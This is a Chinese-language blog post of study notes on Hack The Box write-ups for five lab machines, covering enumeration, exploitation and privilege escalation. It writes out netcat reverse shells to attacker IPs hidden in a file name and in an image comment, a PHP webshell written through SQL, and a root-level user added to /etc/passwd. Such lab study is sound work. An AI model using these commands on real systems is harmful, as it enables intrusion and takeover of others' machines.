---
layout: post
title: 《0xrick's Write-ups for hack-the-box》学习备忘录（二）
description: ""
keywords: ""
---

Paper：[Write-ups for 0xrick's hack-the-box](https://0xrick.github.io/categories/hack-the-box/)

### 八、Chainsaw

环境概述：Linux、Hard、40'、15 Jun 2019

渗透流程：Nmap -> FTP -> WeaponizedPing: Analysis -> WeaponizedPing: Interaction -> WeaponizedPing: Exploitation -> ipfs –> SSH as bobby –> User Flag -> ChainsawClub: Analysis -> ChainsawClub: Exploitation -> Slack Space –> Root Flag

知识点：

- Nmap：使用-sC参数测试出21/tcp FTP服务允许匿名登陆，并列出了当前目录下的文件。
- FTP：kali下使用ftp访问，`ftp host`；将远程机器上的当前目录下的所有文件下载到本地，`mget *`。
- Nmap：全端口扫描，`nmap -p- -T5 chainsaw.htb --max-retries 1 -o nmapfull`；指定端口扫描，`nmap -p 9810 -sV -sT -sC -o nmap9810 chainsaw.htb `。
- 智能合约：Nmap发现9810端口是基于HTTP协议的JSON-RPC服务，使用Python的[web3.py](https://web3py.readthedocs.io/en/stable/index.html)连接以太坊智能合约并与之交互；**与智能合约交互需要获得合约地址和ABI（Application Binary Interface）**；使用[solidity IDE](http://remix.hubwiz.com/)编译合约内容获取ABI，这里作者使用的官方在线IDE测试失败，故使用国内的一款；ABI除了编译合约获取，也可以直接从泄露的JSON-RFC获取。
- echo：将文件内容打印输出为一行，echo -n \`cat file\`。
- IPFS：星际文件系统（InterPlanetary File System）是一个旨在创建持久且分布式存储和共享文件的网络传输协议，在IPFS网络中的节点将构成一个分布式文件系统；获取本地引用，`ipfs refs local`；查看指定引用系统的文件名，`ipfs ls systemhash`；获取文件内容，`ipfs get filehash`。
- John：可以利用John自带的[ssh2john.py](/usr/share/john/ssh2john.py)将SSH的私钥装换成John可识别的hash，并利用John破解密码。
- 端口转发：使用SSH，`ssh -L 63991:127.0.0.1:63991 -i bobby.key.enc bobby@chainsaw.htb`，可以加个-N参数，仅仅用来转发并处于等待状态。
- 数据隐写：Slack space隐写，`bmap --mode slack root.txt --verbose`。

思考：

- FTP：匿名登陆常见弱口令，`anonymous:空`、`ftp:ftp`、`user:pass`。
- 以太坊：以太坊是一个运行智能合约的分布式平台。以太坊类比操作系统，智能合约类比应用。
- 智能合约：智能合约被编译为以太坊虚拟机字节码存储在以太坊的区块链上，通过网络中的每个以太坊节点运行EVM（Ethereum Virtual Machine，以太坊虚拟机）实现并执行指令。如果说比特币是二维世界的话，那么以太坊就是三维世界，可以实现无数个不同的二维世界。传统Web服务的后端业务作为只能合约在以太坊上运行。
- EML格式：是微软为Outlook和Outlook Express开发的文件格式；是将邮件归档后生成的文件，保留着原来的HTML格式和标题。
- Linux登陆：使用私钥登陆服务端仍然要输密码，网上多是说由于服务端文件权限配置问题，各种600、700权限设置，天花乱坠，其实这里还可能是客户端问题。不管是使用ssh-copy-id，`ssh-copy-id -i id_rsa_mac kali@172.16.58.129`，还是直接创建.ssh目录并写入authorized_keys文件，`mkdir .ssh; vim authorized_keys`，默认服务端的权限配置都是已经配好了的，无需更改，因为这里只要求authorized_keys文件的其他组O没有写权限-w即可。至于客户端问题，需要使用-vvT参数输出debug log来观察，`ssh -vvT kali@172.16.58.129`。e.g 我本地是配合config文件使用SSH的，生成的服务器私钥文件名并不为默认id_rsa，log中提示SSH已遍历了一些默认的私钥地址，但并无此私钥，因此需要-i指定私钥位置，或在config中设置服务器连接配置。
- John：默认自带一些服务秘钥转HASH的脚本，kali的在/usr/share/john目录下。
- SSH代理：也可以利用SSH设置代理，`ssh -D 1080 -fN -i bobby.key.enc bobby@chainsaw.htb`
- 这是一个关于智能合约的漏洞环境，从智能合约的定义、编写、编译、部署到交互，可以拓展学习不少有趣的东西。

### 九、Networked

环境概述：Linux、Easy、20'、24 Aug 2019

渗透流程：Nmap -> Web Enumeration -> RCE –> Shell as apache -> Command Injection in check_attack.php –> Shell as guly –> User Flag -> Command Injection in the Network Script Name –> Root Shell –> Root Flag

知识点：

- 信息泄露：使用gobuster枚举目录，发现备份文件。
- tar：解压缩`tar zxvf backup.tar `，压缩`tar zcvf test.tar file1 file2`。
- GetShell：制作图片马，重命名为test.php.png，上传并触发RCE，获取apache shell。
- GetShell：guly用户家目录存在定时任务，每三分钟执行某PHP文件，内含RCE code，`exec("nohup /bin/rm -f $path$value > /dev/null 2>&1 &");`，`$value`参数可控且为指定目录下的文件名，使用touch可新建名为`'; nc 10.10.xx.xx 1338 -c bash'`文件，将代码注入并执行，触发RCE，获取guly shell。
- Linux提权：使用`sudo -l`查看当前用户可以使用sudo的范围情况，如下显示guly可以以root权限调用changename.sh，`sudo ./usr/local/sbin/changename.sh`；此文件是设置网络配置的脚本，参考[exp](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)从而提权。

```
User guly may run the following commands on networked:
    (root) NOPASSWD: /usr/local/sbin/changename.sh
```

思考：

- 代码审计：作者并没有解释为何上传特殊文件导致RCE的。这里是由于lib.php文件的getnameUpload()函数使用了implode()获取文件后缀，导致可以上传`.php.png`后缀的文件，使用`php -a`获得交互来测试，如下；RCE是PHP和Apache配置错误引发的问题，将`.php*`的文件按php执行，参考[paper](https://blog.remirepo.net/post/2013/01/13/PHP-and-Apache-SetHandler-vs-AddHandler)。

```
php > $filename="image.php.png";
php > $pieces = explode('.',$filename); print_r($pieces);
Array
(
    [0] => image
    [1] => php
    [2] => png
)
php > $name= array_shift($pieces); echo $name;
image
php > $name = str_replace('_','.',$name); echo $name;
image
php > $ext = implode('.',$pieces); echo $ext;
php.png
```

- 图片马：制作图片马，文中直接使用的`echo >>`追加，同样原理Windows下使用`copy`来追加，或使用010editor等二进制编辑器来追加，但这些都可能涉及图片完整性问题；可以使用exiftool，`exiftool -Comment='<?php system("nc 10.10.14.4 1337 -e /bin/bash"); ?>' test.php.png`，保持图片完整性。
- 定时任务：家目录下的crontab.guly默认不能触发定时器，定时器服务名为`crond`，日志在`/var/log/cron`。
- Linux网卡设置：如果直接修改网络配置文件，即ifcfg-ethx等文件话，必须通过ifup/ifdown来启动/关闭；CentOS系网络配置文件所在目录`/etc/sysconfig/network-scripts/`，Ubuntu系`/etc/network/interfaces/`。

### 十、Jarvis

环境概述：Linux、Medium、30'、22 Jun 2019

渗透流程：Nmap -> Web Enumeration -> SQLi in room.php -> RCE –> Shell as www-data -> Command Injection in simpler.py –> Shell as pepper –> User Flag -> Systemctl: suid –> Root Shell –> Root Flag

知识点：

- SQL注入：利用切换user-agent来bypass，使用sqlmap，`sqlmap -u http://jarvis.htb/room.php?cod=1 --user-agent "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0" `。
- RCE：利用sqlmap的`--os-shell`直接getshell；或者使用`--passwords`dump hash，并[在线破解](https://crackstation.net)，以此登陆phpmyadmin，执行SQL来getshell；
- GetShell：phpmyadmin执行SQL写入，`SELECT "<?php system($_GET['c']); ?>" into outfile "/var/www/html/sh3ll.php"`。
- GetShell：查看当前用户sudo特权范围，`sudo -l`，发现可以以pepper身份执行simpler.py，`sudo -u pepper /var/www/Admin-Utilities/simpler.py`，-u指定用户，默认root。exec_ping()存在os.system()且接受输入，但过滤了某些符号，使用`$(bash)`绕过，获得pepper shell。
- Linux提权：使用`find / -perm -4000 2>/dev/null`搜索拥有suid的二进制程序，通过[gtfobins](https://gtfobins.github.io/)的SUID tag发现systemctl可被利用；使用systemctl的root权限链接并启动自定义的服务，进而利用服务配置文件[Service]->ExecStart执行脚本，脚本通过在`/etc/passwd`后追加新用户信息来创新用户，`echo 'rooot:gDlPrjU6SWeKo:0:0:root:/root:/bin/bash' >> /etc/passwd`，即以root权限添加用户rooot，UID和GID均为0；使用`su rooot`切换用户，完成提权。

思考：

- SQL注入：MySQL注入绕过姿势，参考[1](https://ai-sewell.me/2017/Some-features-of-MySQL-in-CTF/)。
- SQLMap：`--random-agent `，使用随机的user-agent；其他参数及技巧参考[1](https://xz.aliyun.com/t/3010)、[2](https://xz.aliyun.com/t/3011)。
- GetShell：要执行SQL语句可以直接利用`sqlmap --sql-shell`；phpmyadmin除执行SQL语句写入shell外，还可利用日志、利用自身漏洞（包含、代码执行等）。
- MySQL：version>4.1密码为*+40位hash，Windows的存在于`path\data\mysql\user.MYD`文件中，可直接打开并拼接40位hash来获取，Linux同理在`/var/lib/mysql/mysql/user.MYD`；利用MySQL写入要留意secure_file_priv参数，是用来限制LOAD DATA, SELECT ... OUTFILE, LOAD_FILE()传到哪个指定目录的。
- Linux：systemctl命令启动的服务都是由service配置文件启动的，enable都是link的配置文件；`/etc/passwd`是用户标记文件，每行格式为`用户名:口令:用户标识号:组标识号:注释性描述:主目录:登录Shell`，由于passwd文件任何人可读，即系统默认用户将口令存放到/etc/shadow，在passwd文件的口令字段中只存放一个特殊的字符，例如x或者\*。
- 添加用户：一般在Webshell中，passwd这种交互式的命令无法执行，可以使用chpasswd，`echo 'sewellding:123456' | chpasswd`进行非交互式的添加账户，或者还是使用passwd，`echo "123456" | passwd --stdin 'sewellding'`。

### 十一、Haystack

环境概述：Linux、Easy、20'、29 Jun 2019

渗透流程：Nmap -> Web Enumeration -> Steg in needle.jpg, SSH creds from elasticsearch, User Flag -> Shell as kibana -> Exploiting logstash, Root Shell

知识点：

- 图片隐写：使用strings，`strings needle.jpg`，发现base64 code并解码，`echo bGEgYWd1amEgZW4gZWwgcGFqYXIgZXMgImNsYXZlIg== | base64 -d`，是Spanish西班牙语，转为英语，`la aguja en el pajar es "clave" => the needle in the haystack is "key"`。
- Elasticsearch：默认端口9200，RESTful API，搜索clave关键词，`curl http://haystack.htb:9200/_search?q=clave`，发现SSH普通用户密码。
- 进程监控：[pspy](https://github.com/DominicBreuker/pspy)是一个命令行工具，它可以在没有Root权限的情况下监控Linux进程，黑客可以利用它来查看其他用户的计划任务(cron job)等，在CTF中可快速搜集系统信息；发现logstash是root权限启动的。
- Kibana：默认端口5601，可视化数据，利用本地文件包含漏洞getshell。
- Logstash：默认端口9600，数据处理，由于配置接受`type => "execute"`的文件，造成RCE。

思考：

- ELK：数据从获取->检索->分析->可视化全过程，[demo](https://ai-sewell.me/2019/WeChat-Message-Analyzer)。

### 十二、Safe

环境概述：Linux、Easy、20'、27 Jul 2019

渗透流程：Nmap -> Web Enumeration -> myapp: Analysis -> myapp: Exploitation -> Cracking the KeePass Database –> Root Shell

知识点：

- 信息搜集：80/tcp碰到Apache默认页面很讨厌，除了搜集sub directories, vhosts, other ports etc，留意默认页面的注释发现线索。CTF-style...
- 缓冲区溢出：使用nc与服务交互，`nc safe.htb 1337`；输入长字符测试使程序崩溃，发生缓冲区溢出，提示Segmentation fault。
- PWN：使用`checksec`检查程序，Finding the Offset -> ROP Chain。
- 文件下载：使用scp，`scp -i ./id_rsa user@safe.htb:/home/user/MyPasswords.kdbx ./MyPasswords.kdbx `。
- 密码破解：kdbx文件是通过KeePass密码安全创建的数据文件，使用john的keepass2john脚本将（图片key+kdbx数据文件）转为口令hash并使用john破解，`keepass2john -k IMG_0547.JPG ./MyPasswords.kdbx > hash.txt`，`john --wordlist=./rockyou-70.txt ./hash.txt`，得到Master Password。
- KeePass：使用Master Password和图片Key登陆数据库.kdbx。 
- 用户切换：使用su，默认切换到root用户，输入KeePass泄露的密码登陆。

思考：

- 信息搜集：默认情况下，Nmap用指定的协议对端口1-1024以及`nmap-services` 文件中列出的更高的端口在扫描，可以使用`-p-`来扫1-65535端口。
- KeePass：一款开源（开源最大的优势就是即使将来有一天开发者不更新了也会有其他开发者接手）的密码管理器。单数据库文件有点类似常见的Access数据库（.mdb）、SQLite3数据库（.sqlite）。